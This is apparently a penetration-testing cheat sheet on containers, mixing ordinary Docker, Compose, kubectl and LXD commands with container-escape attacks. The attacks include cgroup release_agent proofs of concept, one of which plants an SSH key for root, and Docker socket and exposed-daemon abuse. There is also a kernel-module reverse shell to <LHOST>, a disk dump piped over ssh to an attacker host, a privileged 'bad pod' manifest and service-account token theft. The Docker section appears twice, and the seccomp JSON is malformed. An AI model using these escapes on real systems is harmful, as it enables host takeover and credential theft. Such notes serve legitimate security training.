# Container

- [Resources](#resources)

## Table of Contents

- [deepce](#deepce)
- [Docker](#docker)
- [Docker-Compose](#docker-compose)
- [kubectl](#kubectl)
- [kubeletctl](#kubeletctl)
- [Kubernetes](#kubernetes)
- [LXD](#lxd)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Awesome Kubernetes (K8s) Security | A curated list for Kubernetes (K8s) Security resources such as articles, books, tools, talks and videos. | https://github.com/magnologan/awesome-k8s-security |
| Bad Pods | A collection of manifests that will create pods with elevated privileges. | https://github.com/BishopFox/badPods |
| Break out the Box (BOtB) | A container analysis and exploitation tool for pentesters and engineers. | https://github.com/brompwnie/botb |
| CDK - Zero Dependency Container Penetration Toolkit | Make security testing of K8s, Docker, and Containerd easier. | https://github.com/cdk-team/CDK |
| deepce | Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)  | https://github.com/stealthcopter/deepce |
| Harpoon | A collection of scripts, and tips and tricks for hacking k8s clusters and containers. | https://github.com/ProfessionallyEvil/harpoon |
| Krane | Kubernetes RBAC static analysis & visualisation tool | https://github.com/appvia/krane |
| Kubletctl | A client for kubelet | https://github.com/cyberark/kubeletctl |
| Kubestriker | A Blazing fast Security Auditing tool for Kubernetes. | https://github.com/vchinnipilli/kubestriker |
| Peirates | Peirates - Kubernetes Penetration Testing tool | https://github.com/inguardians/peirates |
| ThreatMapper | Open source cloud native security observability platform. Linux, K8s, AWS Fargate and more. | https://github.com/deepfence/ThreatMapper |

## deepce

```c
$ ./deepce.sh --exploit SOCK --command "cp /usr/bin/bash /mnt/bash; /usr/bin/chmod 4755 /mnt/bash;"
```

## Docker

### Installation of the latest Version

> https://docs.docker.com/engine/install/ubuntu/

```c
$ sudo apt-get update
$ sudo apt-get install ca-certificates curl gnupg
```

```c
$ sudo install -m 0755 -d /etc/apt/keyrings
$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
$ sudo chmod a+r /etc/apt/keyrings/docker.gpg
```

```c
$ echo \
  "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```

```c
$ sudo apt-get update
$ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

### Common Commands

```c
$ docker pull <IMAGE>                  // pull image
$ docker pull <IMAGE>:latest           // pull image with latest version
$ docker pull <IMAGE>:<VERSION>        // pull image with specific version
$ docker image ls                      // list images
$ docker image rm <IMAGE>              // remove image
$ docker image rm <IMAGE>:latest       // remove image with latest version
$ docker image rm <IMAGE>:<VERSION>    // remove image with specific version
$ docker run --name <IMAGE>            // use a memorable name
$ docker run -it <IMAGE> /bin/bash     // interact with image
$ docker run -it -v /PATH/TO/DIRECTORY:/PATH/TO/DIRECTORY <IMAGE> /bin/bash   // run image and mount specific directory
$ docker update --restart unless-stopped <CONTAINER>    // auto start container
$ docker run -d <IMAGE>                // run image in background
$ docker run -p 80:80 <IMAGE>          // bind port on the host
$ docker ps                            // list running containers
$ docker ps -a                         // list all containers
$ docker stop <ID>                     // stops a specific container
$ docker rm <ID>                       // delete a specific container
$ docker exec -it <ID> /bin/bash       // enter a running container
```

```c
$ docker -H <RHOST>:2375 info
$ docker -H <RHOST>:2375 images
$ docker -H <RHOST>:2375 version
$ docker -H <RHOST>:2375 ps -a
$ docker -H <RHOST>:2375 exec -it 01ca084c69b7 /bin/sh
```

### Dockerfiles

- FROM       // build from a specific base image
- RUN        // execute command in the container within a new layer
- COPY       // copy files from the host filesystem
- WORKDIR    // set the root file system of the container
- CMD        // determines what command is run when the container starts (Example: CMD /bin/sh -c <FILE>.sh)
- EXPOSE     // publishes a port in the users context

#### Example Dockerfile

```c
# Example Dockerfile
FROM ubuntu:22.04

# Set working directory
WORKDIR /

# Create a file inside of the root directory
RUN touch <FILE>

# Perform updates
RUN apt-get update -y

# Install apache2
RUN apt-get install apache2 -y

# Expose port 80/TCP
EXPOSE 80

# Start the service
CMD ["apache2ctl", "-D","FOREGROUND"]
```

#### Build Example Dockerfile

```c
$ docker build -t <NAME> .
$ docker run -d --name <NAME> -p 80:80 <NAME>
```

### Capabilities

#### List Capabilities

```c
$ capsh --print
```

#### Example

```c
$ docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE <WEBSERVER>
```

### AppArmor

```c
$ aa-status
```

#### profile.json

- Can read files located in `/var/www/`, `/etc/apache2/mime.types` and `/run/apache2`.
- Read & write to `/var/log/apache2`.
- Bind a socket for port `80/TCP` but not other `ports` or `protocols`.
- `Cannot read` from directories such as `/bin`, `/lib`, `/usr`.

```c
/usr/sbin/httpd {

  capability setgid,
  capability setuid,

  /var/www/** r,
  /var/log/apache2/** rw,
  /etc/apache2/mime.types r,

  /run/apache2/apache2.pid rw,
  /run/apache2/*.sock rw,

  # Network access
  network tcp,

  # System logging
  /dev/log w,

  # Allow CGI execution
  /usr/bin/perl ix,

  # Deny access to everything else
  /** ix,
  deny /bin/**,
  deny /lib/**,
  deny /usr/**,
  deny /sbin/**
}
```

#### Import Profile

```c
$ apparmor_parser -r -W /PATH/TO/PROFILE/profile.json
```

#### Apply Profile

```c
$ docker run --rm -it --security-opt apparmor=/PATH/TO/PROFILE/profile.json <CONTAINER>
```

### Seccomp

#### profile.json

```c
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "name": "socket",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "connect",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "bind",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "listen",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "accept",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    }
    {
      "name": "read",
      "action": "SCMP_ACT_ALLOW",
      "args": []
    },
    {
      "name": "write",
      "action": "SCMP_ACT_ALLOW",
      "args": []
    }
  ]
}
```

#### Apply Profile

```c
$ docker run --rm -it --security-opt seccomp=/PATH/TO/PROFILE/profile.json <CONTAINER>
```

### Container Escapes

#### Control Groups (cgroup) Privilege Escalation

> https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.

##### Requirements

* Already root inside a container
* The container must be run with the SYS_ADMIN Linux capability
* The container must lack an AppArmor profile, or otherwise allow the mount syscall
* The cgroup v1 virtual filesystem must be mounted read-write inside the container

##### Checking Capabilities

```c
$ capsh --print
```

##### Vulnerability Indicator Flag

```c
--security-opt apparmor=unconfined --cap-add=SYS_ADMIN
```

##### Modified PoC by TryHackMe

```c
$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
$ echo 1 > /tmp/cgrp/x/notify_on_release
$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
$ echo "$host_path/exploit" > /tmp/cgrp/release_agent
$ echo '#!/bin/sh' > /exploit
$ echo "cat /home/cmnatic/<FILE> > $host_path/<FILE>" >> /exploit
$ chmod a+x /exploit
$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

##### PoC for SSH Key Deployment

```c
mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
echo 1 > /tmp/exploit/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/exploit/release_agent

echo '#!/bin/sh' > /cmd
echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
```

#### Docker Socket Privilege Escalation

##### Checking for Docker Socket

```c
$ ls -la /var/run | grep sock
```

##### Create a privileged Docker Container and mount the Host Filesystem

```c
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

#### Abusing Exposed Docker Daemon

##### Checking for Misconfiguration

```c
$ curl http://<RHOST>:2375/version
```

##### Command Execution

```c
$ docker -H tcp://<RHOST>:2375 ps
```

```c
$ docker -H <RHOST>:2375 commit 01ca084c69b7
sha256:aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac

Initial CONTAINER ID: 01ca084c69b7
New COMMIT:           aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
New CONTAINER ID:     aa02ba520ac9
```

```c
$ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

#### Abusing Namespaces

##### Verify Environment

```c
$ ps aux
```

##### Exploitation via Namespace Enter (nsenter)

```c
$ nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

#### Abusing SYS_MODULE Capability

> https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities

##### Kernel Module

###### reverse-shell.c

```
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

##### Makefile

```c
obj-m +=reverse-shell.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib
```

##### Execution

```c
$ insmod reverse-shell.ko
```

#### Abusing CAP_MKNOD Capability

##### Pre-requisites

- 2 shells
- root privileges inside container
- CAP_MKNOD

```c
root@<CONTAINER>:/# mknod sda b 8 0
root@<CONTAINER>:/# chmod 777 sda
root@<CONTAINER>:/# su <USERNAME>
<USERNAME>@<CONTAINER>:/root$ /bin/sh
```


```c
<USERNAME>@<RHOST>:~$ ps aux | grep /bin/sh
<USERNAME>     2434  0.0  0.0   2576   932 ?        S+   19:58   0:00 /bin/sh
<USERNAME>     2438  0.0  0.0   6480  2164 pts/1    S+   19:59   0:00 grep --color=auto /bin/sh
```

```c
<USERNAME>@<RHOST>:~$ cd /proc/2434/root
<USERNAME>@<RHOST>:/proc/2434/root$
```

Then you can read files through the blob on the host system. Alternatively you can dump them into an image file via SSH.

```c
$ dd if=/proc/2434/sda bs=512 | gzip -1 - | ssh <USERNAME>@<LHOST> 'dd of=/home/<USERNAME>/image.gz'
```

## Docker

### Installation of the latest Version

> https://docs.docker.com/engine/install/ubuntu/

```c
$ sudo apt-get update
$ sudo apt-get install ca-certificates curl gnupg
```

```c
$ sudo install -m 0755 -d /etc/apt/keyrings
$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
$ sudo chmod a+r /etc/apt/keyrings/docker.gpg
```

```c
$ echo \
  "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```

```c
$ sudo apt-get update
$ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

### Common Commands

```c
$ docker pull <IMAGE>                  // pull image
$ docker pull <IMAGE>:latest           // pull image with latest version
$ docker pull <IMAGE>:<VERSION>        // pull image with specific version
$ docker image ls                      // list images
$ docker image rm <IMAGE>              // remove image
$ docker image rm <IMAGE>:latest       // remove image with latest version
$ docker image rm <IMAGE>:<VERSION>    // remove image with specific version
$ docker run --name <IMAGE>            // use a memorable name
$ docker run -it <IMAGE> /bin/bash     // interact with image
$ docker run -it -v /PATH/TO/DIRECTORY:/PATH/TO/DIRECTORY <IMAGE> /bin/bash   // run image and mount specific directory
$ docker update --restart unless-stopped <CONTAINER>    // auto start container
$ docker run -d <IMAGE>                // run image in background
$ docker run -p 80:80 <IMAGE>          // bind port on the host
$ docker ps                            // list running containers
$ docker ps -a                         // list all containers
$ docker stop <ID>                     // stops a specific container
$ docker rm <ID>                       // delete a specific container
$ docker exec -it <ID> /bin/bash       // enter a running container
```

```c
$ docker -H <RHOST>:2375 info
$ docker -H <RHOST>:2375 images
$ docker -H <RHOST>:2375 version
$ docker -H <RHOST>:2375 ps -a
$ docker -H <RHOST>:2375 exec -it 01ca084c69b7 /bin/sh
```

### Dockerfiles

- FROM       // build from a specific base image
- RUN        // execute command in the container within a new layer
- COPY       // copy files from the host filesystem
- WORKDIR    // set the root file system of the container
- CMD        // determines what command is run when the container starts (Example: CMD /bin/sh -c <FILE>.sh)
- EXPOSE     // publishes a port in the users context

#### Example Dockerfile

```c
# Example Dockerfile
FROM ubuntu:22.04

# Set working directory
WORKDIR /

# Create a file inside of the root directory
RUN touch <FILE>

# Perform updates
RUN apt-get update -y

# Install apache2
RUN apt-get install apache2 -y

# Expose port 80/TCP
EXPOSE 80

# Start the service
CMD ["apache2ctl", "-D","FOREGROUND"]
```

#### Build Example Dockerfile

```c
$ docker build -t <NAME> .
$ docker run -d --name <NAME> -p 80:80 <NAME>
```

### Capabilities

#### List Capabilities

```c
$ capsh --print
```

#### Example

```c
$ docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE <WEBSERVER>
```

### AppArmor

```c
$ aa-status
```

#### profile.json

- Can read files located in `/var/www/`, `/etc/apache2/mime.types` and `/run/apache2`.
- Read & write to `/var/log/apache2`.
- Bind a socket for port `80/TCP` but not other `ports` or `protocols`.
- `Cannot read` from directories such as `/bin`, `/lib`, `/usr`.

```c
/usr/sbin/httpd {

  capability setgid,
  capability setuid,

  /var/www/** r,
  /var/log/apache2/** rw,
  /etc/apache2/mime.types r,

  /run/apache2/apache2.pid rw,
  /run/apache2/*.sock rw,

  # Network access
  network tcp,

  # System logging
  /dev/log w,

  # Allow CGI execution
  /usr/bin/perl ix,

  # Deny access to everything else
  /** ix,
  deny /bin/**,
  deny /lib/**,
  deny /usr/**,
  deny /sbin/**
}
```

#### Import Profile

```c
$ apparmor_parser -r -W /PATH/TO/PROFILE/profile.json
```

#### Apply Profile

```c
$ docker run --rm -it --security-opt apparmor=/PATH/TO/PROFILE/profile.json <CONTAINER>
```

### Seccomp

#### profile.json

```c
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "name": "socket",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "connect",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "bind",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "listen",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "accept",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    }
    {
      "name": "read",
      "action": "SCMP_ACT_ALLOW",
      "args": []
    },
    {
      "name": "write",
      "action": "SCMP_ACT_ALLOW",
      "args": []
    }
  ]
}
```

#### Apply Profile

```c
$ docker run --rm -it --security-opt seccomp=/PATH/TO/PROFILE/profile.json <CONTAINER>
```

### Control Groups (cgroup) Privilege Escalation

> https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.

#### Requirements

* Already root inside a container
* The container must be run with the SYS_ADMIN Linux capability
* The container must lack an AppArmor profile, or otherwise allow the mount syscall
* The cgroup v1 virtual filesystem must be mounted read-write inside the container

#### Checking Capabilities

```c
$ capsh --print
```

#### Vulnerability Indicator Flag

```c
--security-opt apparmor=unconfined --cap-add=SYS_ADMIN
```

#### Modified PoC by TryHackMe

```c
$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
$ echo 1 > /tmp/cgrp/x/notify_on_release
$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
$ echo "$host_path/exploit" > /tmp/cgrp/release_agent
$ echo '#!/bin/sh' > /exploit
$ echo "cat /home/cmnatic/<FILE> > $host_path/<FILE>" >> /exploit
$ chmod a+x /exploit
$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### PoC for SSH Key Deployment

```c
mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
echo 1 > /tmp/exploit/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/exploit/release_agent

echo '#!/bin/sh' > /cmd
echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
```

### Docker Socket Privilege Escalation

#### Checking for Docker Socket

```c
$ ls -la /var/run | grep sock
```

#### Create a privileged Docker Container and mount the Host Filesystem

```c
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Exposed Docker Daemon

#### Checking for Misconfiguration

```c
$ curl http://<RHOST>:2375/version
```

#### Command Execution

```c
$ docker -H tcp://<RHOST>:2375 ps
```

```c
$ docker -H <RHOST>:2375 commit 01ca084c69b7
sha256:aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac

Initial CONTAINER ID: 01ca084c69b7
New COMMIT:           aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
New CONTAINER ID:     aa02ba520ac9
```

```c
$ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Abusing Namespaces

#### Verify Environment

```c
$ ps aux
```

#### Exploitation via Namespace Enter (nsenter)

```c
$ nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

### Abusing SYS_MODULE Capability

> https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities

#### Kernel Module

##### reverse-shell.c

```
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

#### Makefile

```c
obj-m +=reverse-shell.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib
```

#### Execution

```c
$ insmod reverse-shell.ko
```
  
## Docker-Compose

### Common Commands

```c
$ docker-compose up       // (re)create/build and start containers specified in the compose file
$ docker-compose start    // start specific containers from compose file
$ docker-compose down     // stop and delete containers from the compose file
$ docker-compose stop     // stop (not delete) containers from the compose file
$ docker-compose build    // build (not start) containers from the compose file
```

### Create Networks and run Containers

```c
$ docker network create <NETWORK>
$ docker run -p 80:80 --name <NAME> --net <NETWORK> <NAME>
$ docker run --name <NAME> --net <NETWORK> <NAME>
$ docker-compose up
```

### docker-compose.yml Files

| Instruction | Explanation | Example |
| --- | --- | --- |
| version | Placed on top of the file to identify the version of docker-compose the file is written for. | 3.3 |
| services | Marks the beginning of the containers to be managed. | services: |
| name | Define the container and its configuration. | webserver |
| build | Defines the directory containing the Dockerfile for this container/service. | ./<NAME> |
| ports | Publishes ports to the exposed ports (this depends on the image/Dockerfile). | '80:80' |
| volumes | Lists the directories that should be mounted into the container from the host operating system. | './home/<USERNAME>/webserver/:/var/www/html' |
| environment | Pass environment variables (not secure), i.e. passwords, usernames, timezone configurations, etc. | MYSQL_ROOT_PASSWORD=<PASSWORD> |
| image | Defines what image the container should be built with. | mysql:latest |
| networks | Defines what networks the containers will be a part of. Containers can be part of multiple networks. | <NETWORK> |

#### Example docker-compose.yml

```c
version: '3.3'
services:
  web:
    build: ./web
    networks:
      - <NETWORK>
    ports:
      - '80:80'


  database:
    image: mysql:latest
    networks:
      - <NETWORK>
    environment:
      - MYSQL_DATABASE=<DATABASE>
      - MYSQL_USERNAME=root
      - MYSQL_ROOT_PASSWORD=<PASSWORD>
    
networks:
  <NETWORK>:
```

## kubectl

### Installation

> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/

> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux

```c
$ sudo apt-get update && sudo apt-get install -y apt-transport-https
$ curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo gpg --dearmour -o /usr/share/keyrings/kubernetes.gpg
$ echo "deb [arch=amd64 signed-by=/usr/share/keyrings/kubernetes.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee -a /etc/apt/sources.list.d/kubernetes.list
$ sudo apt-get update
$ sudo apt-get install -y kubectl
```
### Common Commands

```c
$ kubectl get pods                                // list all available pods
$ kubectl get services                            // list all services
$ kubectl get serviceaccount                      // list all serviceaccounts
$ kubectl auth can-i --list                       // check permissions
$ kubectl get secrets                             // list secrets
$ kubectl describe secret <SECRET>                // display secret
$ kubectl get secret <SECRET> -o 'json'           // show in detail
$ kubectl describe pod <CONTAINER>                // get container information
$ kubectl delete pod <CONTAINER>                  // delete a specific container
$ kubectl auth can-i --list --token=<TOKEN>       // check permissions with authentication
$ kubectl apply -f privesc.yml --token=<TOKEN>    // apply pod configuration file
$ kubectl exec -it <CONTAINER> --token=<TOKEN> -- /bin/bash                    // gain access to a container
$ kubectl exec -it everything-allowed-exec-pod --token=<TOKEN> -- /bin/bash    // execute privileged container
```

### Secret Location

```c
/var/run/secrets/kubernetes.io/serviceaccount/token
```

### Bad Pod Container Escape

> https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

> https://jsonformatter.org/yaml-formatter

```c
$ export token="<TOKEN>"
```

```c
cat << 'EOF' |
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
EOF
(export NAMESPACE=default && ./kubectl apply -n $NAMESPACE -f - --token=$TOKEN)
```

## kubeletctl

> https://github.com/cyberark/kubeletctl

```c
$ kubeletctl pods -s <RHOST>
$ kubeletctl runningpods -s <RHOST>
$ kubeletctl runningpods -s <RHOST> | jq -c '.items[].metadata | [.name, .namespace]'
$ kubeletctl -s <RHOST> scan rce
$ kubeletctl -s <RHOST> exec "id" -p <POD> -c <CONTAINER>
$ kubeletctl -s <RHOST> exec "/bin/bash" -p <POD> -c <CONTAINER>
$ kubeletctl -s <RHOST> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER>
```

## Kubernetes

### API RBAC Attack

```c
$ kubectl get namespaces
$ kubectl get pods --all-namespaces -o wide
$ kubectl get pods -n <NAMESPACE>
$ kubectl describe pod <POD> -n <NAMESPACE>
$ kubectl -n <NAMESPACE> --token=<TOKEN> auth can-i --list
$ kubectl get secrets -n <NAMESPACE>
$ kubectl describe secrets/<SECRET> -n <NAMESPACE>
$ kubectl --token=<TOKEN> cluster-info
$ kubectl --token=<TOKEN> auth can-i create pod
$ kubectl create -f <BADPOD>.yaml --token=<TOKEN>
```

## LXD

> https://github.com/saghul/lxd-alpine-builder

### Privilege Escalation

```c
$ sudo ./build-alpine
```

or

```c
$ sudo ./build-alpine -a i686
```

### Configuration

```c
$ lxd init
```

### Settings

```c
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like LXD to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```

### Starting

```c
$ lxc launch ubuntu:18.04
```

### Import

```c
$ lxc image import ./alpine-v3.12-x86_64-20200622_0953.tar.gz --alias foobar
```

### Status

```c
$ lxc image list
```

### Security Parameters

```c
$ lxc init foobar ignite -c security.privileged=true
```

### Set mount Options

```c
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

### Starting Image

```c
$ lxc start ignite
```

### Enter Image

```c
$ lxc exec ignite /bin/sh
```
